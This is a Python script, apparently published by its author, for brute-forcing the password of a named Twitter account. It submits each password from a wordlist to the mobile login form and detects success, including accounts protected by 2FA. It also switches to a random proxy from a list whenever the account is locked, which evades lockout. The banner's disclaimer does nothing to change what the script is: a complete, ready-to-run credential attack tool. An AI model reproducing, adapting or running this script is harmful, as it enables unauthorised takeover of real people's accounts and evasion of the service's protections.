#!/usr/bin/env python
# -*- coding: utf-8 -*-

import mechanize
from proxylist import ProxyList
import sys, os, argparse

print('''\033[1;32m
             a8888a           M""""""""M M#"""""""'M  MM""""""""`M 
            d8' ..8b          Mmmm  mmmM ##  mmmm. `M MM  mmmmmmmM 
            88 .P 88 dP.  .dP MMMM  MMMM #'        .M M'      MMMM 
            88 d' 88  `8bd8'  MMMM  MMMM M#  MMMb.'YM MM  MMMMMMMM 
            Y8'' .8P  .d88b.  MMMM  MMMM M#  MMMM'  M MM  MMMMMMMM 
             Y8888P  dP'  `dP MMMM  MMMM M#       .;M MM  MMMMMMMM 
                              MMMMMMMMMM M#########M  MMMMMMMMMMMM 
            ooooooooooooooooooooooooooooooooooooooooooooooooooooo
            o [==] Coded By: Abdullah AlZahrani (0xAbdullah)    o
            o [##] Twitter: @0xAbdullah | GitHub.com/0xAbdullah o
            o [**] \033[1;m\033[1;41mI am not responsible for your action\033[1;m\033[1;32m         o
            ooooooooooooooooooooooooooooooooooooooooooooooooooooo
\033[1;m''')

parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Twitter brute-force")
parser.add_argument('-u', required=True, default=None, help='Target username.')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
parser.add_argument('-proxy', required=True, default=None, help='Proxy list / Path of Proxy list file.')
args = vars(parser.parse_args())

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True
b.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

username = args['u']
passwordList = args['p']
proxyList = args['proxy']

if os.path.exists(args['p']) == False:
    sys.exit("[!] password file does not exist !")
elif os.path.exists(args['proxy']) == False:
    sys.exit("[!] proxy list file does not exist !")
print("[@] Target Account: {}".format(username))
def Proxy():
    try:
        pl = ProxyList()
        pl.load_file(proxyList)
        pl.random()
        proxy = pl.random().address()
        b.set_proxies(proxies={"https": proxy})
        ProxtIP = b.open("https://api.ipify.org/?format=raw", timeout=3)
    except:
        Proxy()

def Twitter():
    password = open(passwordList).read().splitlines()
    for password in password:
        sys.stdout.write('\r[!] {} '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"
        try:
            response = b.open(url, timeout=10)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()
            if 'https://mobile.twitter.com/account/login_challenge' in response.geturl():
                print("\n[!] Password Found: {} --> But There is a 2FA".format(password))
                break
            elif response.geturl() == "https://mobile.twitter.com/home":
                print("[^] Password Found {}".format(password))
                break
            elif 'https://mobile.twitter.com/account/locked' in response.geturl():
                Proxy()
            else:
                sys.stdout.write("[!] False\n")
        except:
            sys.stdout.write('[-] something wrong\n')
            sys.stdout.flush()
            Proxy()

if __name__ == '__main__':
    Proxy()
    Twitter()